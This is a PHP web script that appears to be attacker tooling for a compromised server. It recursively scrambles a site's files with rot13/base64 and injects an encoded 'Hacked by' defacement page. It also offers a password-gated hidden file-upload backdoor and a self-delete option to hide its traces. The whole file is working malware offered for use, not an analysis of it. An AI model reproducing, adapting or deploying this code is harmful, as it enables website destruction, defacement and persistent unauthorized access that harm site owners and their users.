<?php

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

class xploit
{
    public function generate_enc($leak){
        for ($i=1; $i <3; $i++) { 
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            $leak = base64_encode(str_rot13($leak));
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
        }
            $pesan  = base64_decode("PHRpdGxlPkN5Ym9yZyB4cGxvaXQgd2FzIGhlcmUgITwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KKnsNCmJhY2tncm91bmQ6I2ZmZjsNCn0NCg0KcCB7DQptYXJnaW46MCAxMDBweDsNCmZvbnQtc2l6ZToxLjV2dzsNCmNvbG9yOiMwMDA7DQp9DQoNCmltZyB7DQp3aWR0aDozMCU7DQp9DQoNCjwvc3R5bGU+DQo8dGFibGUgaGVpZ2h0PSIyNSUiIHdpZHRoPSIxMDAlIj4NCjx0ZCBhbGlnbj0iY2VudGVyIj4NCgk8cD5IYWNrZWQgYnkgPGI+QHVua25vd248L2I+PC9wPg0KPHByZT48Zm9udCBzaXplPSI2Ij4NCg0KIF9fX19fX19fIF9fICAgICBfX19fX18gX19fX19fICAgICAgICAgICAgICAgICAgICAgICANCnwgIHwgIHwgIHwgIHwtLS58ICAgICAgfCAgICAgIHwuLS0tLS0uLS0tLS0uICAgICAgICAgDQp8ICB8ICB8ICB8ICAgICB8fCAgLS0gIHwgIC0tICB8fCAgXyAgfC0tIF9ffF9fIF9fIF9fIA0KfF9fX19fX19ffF9ffF9ffHxfX19fX198X19fX19ffHwgICBfX3xfX19fX3xfX3xfX3xfX3wNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8X198ICAgICAgICAgICAgICAgICAgDQoNCg0KPC9mb250PjwvcHJlPg0KDQoJPHA+SSBoYXZlIDxiPmhpamFja2VkPC9iPiB0aGlzIHNpdGUgYW5kIDxiPmRlc3Ryb3llZDwvYj4gaXQgYmVjYXVzZSB5b3UgZm9yZ290IHRvIHBheSB0YXhlcy48L3A+DQoJPHA+WW91IG5lZWQgdG8gcmVtZW1iZXIgdGhhdCBzbWFydCBwZW9wbGUgYXJlIG1vcmUgYW5ub3lpbmcgdGhhbiBzdHVwaWQgcGVvcGxlLjwvcD4=");
            $leak   = "<!--#Down#".$leak."--> <title>Yowaimo</title> <em>".$pesan."</em>";
        return $leak;
    }
    public function generate_dec($leak){
        $woh = "/<!--#LOCK#(.*?)-->/";
        preg_match($woh, $leak, $matches);
        if($matches[1]){
            $leak = $matches[1];
            for ($i=1; $i <3; $i++) {
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
                $leak = str_rot13(base64_decode($leak));
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            }
        }else{
            return false;
        }
            return $leak;
    }
    public function lock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = xploit::generate_enc($fgt);
        if(xploit::w00t($lock,$location_file)){
            echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Locked Done!!!</font><br>";
        }else{
            echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='red'>Locked Fail!!!</font><br>";
        }
    }
    public function unlock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = xploit::generate_dec($fgt);
        if(xploit::w00t($lock,$location_file)){
             echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Done!!!</font><br>";
        }else{
             echo "root@whoami:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Fail!!!</font><br>";
        }
     }

     public function w00t($data,$locate){
        if( file_put_contents($locate, htmlentities($data) ) ){
               return true;
            }else{
               return false;
        }
     }

     public function heum($ext,$name){
        $re = "/({$name})/";  
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }

    public function boom($dir,$mode)
    {
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $d = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($d)){
                    if(xploit::heum($d,".png") && xploit::heum($d,".svg") && xploit::heum($d,".woff") && xploit::heum($d,".jpg") && xploit::heum($d,".htaccess") && xploit::heum($d,"lol.php")  ){
                    
                    if($mode == "1"){
                        $locaked = xploit::lock($d);
                    }else{
                        $unlock = xploit::unlock($d);
                    }

                    }
                }else{
                    xploit::boom($d,$mode);
                }
            }
        flush();
        ob_flush();
        }
    }
    public function locate(){
        return getcwd();
    }
    public function savemode(){
        $remove = unlink(basename($_SERVER['PHP_SELF']));
        if($remove){
            return true;
        }else{
            return false;
        }
    }

}
?>

<!DOCTYPE html>
<html>
<head>
    <title>403</title>
<style type="text/css">
    body{
            color: #3EF403;
            background-color: black;
    }
    input {
            border: dashed 1px;
            border-color: #4CAF50;
            background-color: Black;
            font: 8pt Verdana;
            color: #0CFF37;
    }
 
    select {
        border: dashed 1px;
        border-color: #4CAF50;
        background-color: Black;
        font: 8pt Verdana;
        color: #4CAF50;
    }
        </style>
</head>
<body>
<pre style="text-align: center"><font color="#5E00FF">

▄███▄      ▄  █ ▄▄  █    ████▄ ▄█    ▄▄▄▄▀ 
█▀   ▀ ▀▄   █ █   █ █    █   █ ██ ▀▀▀ █    
██▄▄     █ ▀  █▀▀▀  █    █   █ ██     █    
█▄   ▄▀ ▄ █   █     ███▄ ▀████ ▐█    █     
▀███▀  █   ▀▄  █        ▀       ▐   ▀      
        ▀       ▀                          
                       
</font></pre>
 
<Center>
<?php 
if($_GET['pwd']=="whoami"){
echo '
<form method=POST enctype="multipart/form-data" action="">
<input type="file" name="files" class="upload"> <input type=submit value="Upload"></form>';
    $files = @$_FILES["files"];
    if ($files["name"] != '') {
        $fullpath = $files["name"];
        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
            echo '<font color="green">Berhasil tod!!!</font>';
        }else{
            echo '<font color="red">Gagal tod!!!</font>';
        }
    }
}else{?>
<form action="" method="post">
<input type="text" name="url" placeholder="<?= xploit::locate(); ?>" value="<?= xploit::locate(); ?>">
<select name="method">
        <option value="1">Locked</option>
        <option value="2">Unlocked</option>
</select>
<input type="checkbox" name="savemode" value="1">Save Mode
<input type="submit" name="submit" value="Gas!!!"/>
</form>
<pre style="text-align: left;"><?php
 if(isset($_POST['submit'])){
    echo xploit::boom($_POST['url'],$_POST['method']);
    if($_POST['savemode']=="1"){
        if(xploit::savemode()){
        echo ">,< Lari ada heker...";
        }
    }
}
?>
<?php
}
?>
</pre>
</Center>
</body>
</html>
